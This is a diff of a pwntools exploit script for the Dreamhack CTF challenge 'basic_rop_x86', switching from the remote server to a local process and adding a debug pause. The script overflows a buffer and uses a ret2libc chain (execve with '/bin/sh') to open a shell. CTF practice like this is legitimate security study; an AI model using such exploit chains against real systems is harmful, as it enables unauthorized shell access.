@@ -1,9 +1,10 @@
 from pwn import *
 
 context.update(log_level='debug')
-p = remote('host1.dreamhack.games', 12385)
-#p = process('basic_rop_x86')
-libc = ELF('libc.so.6')
+#p = remote('host1.dreamhack.games', 12385)
+p = process('basic_rop_x86')
+#libc = ELF('libc.so.6')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 elf = ELF('basic_rop_x86')
 offset_system = libc.symbols['system']
 offset_execve = libc.symbols['execve']
@@ -33,11 +34,10 @@ addr_libc_binsh = addr_libc_base + list(libc.search('/bin/sh'))[0]
 log.info('addr_libc_binsh: ' + hex(addr_libc_binsh))
 payload = 'a'*0x48 + p32(addr_libc_execve) + p32(0) + p32(addr_libc_binsh) + p32(0)*4
 #payload = 'a'*0x48 + p32(addr_main) + p32(0) + p32(addr_libc_binsh) + p32(0)*4
+raw_input('debug: ' + str(p.pid))
 p.sendline(payload)
 #p.recvrepeat(1)
 p.recv(999)
 
 
 p.interactive()
-
-
